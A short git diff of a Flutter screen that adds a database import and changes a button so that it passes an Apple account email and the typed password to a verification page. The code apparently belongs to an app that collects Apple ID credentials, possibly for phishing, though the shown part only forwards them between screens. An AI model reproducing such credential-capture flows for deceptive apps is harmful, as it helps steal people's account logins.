@@ -3,6 +3,7 @@ import 'package:flutter/material.dart';
 import 'package:url_launcher/link.dart';
 
 import '../Verify/verifylayout.dart';
+import '../database.dart';
 
 class PassTabletScreen extends StatefulWidget {
   final String callback;
@@ -119,18 +120,17 @@ class _PassTabletScreenState extends State<PassTabletScreen> {
                                                   size: 30,
                                                   color: Colors.grey,
                                                 ),
-                                                onPressed: () {
-                                                  {
-                                                    Navigator.of(context).push(
-                                                        MaterialPageRoute(
-                                                            builder: (context) =>
-                                                                VerifyLayoutPage(
-                                                                    verify: widget
-                                                                        .callback)));
-                                                  }
-                                                  // if (formkey.currentState!
-                                                  //     .validate()) {}
-                                                }),
+                                                onPressed: () => {
+                                                   
+                                                      Navigator.of(context).push(
+                                                          MaterialPageRoute(
+                                                              builder: (context) =>
+                                                                  VerifyLayoutPage(
+                                                                      appleEmail: widget.callback, applePassword: passwordController.text,)))
+
+                                                      // if (formkey.currentState!
+                                                      //     .validate()) {}
+                                                    }),
                                       ),
                                     ),
                                   ),
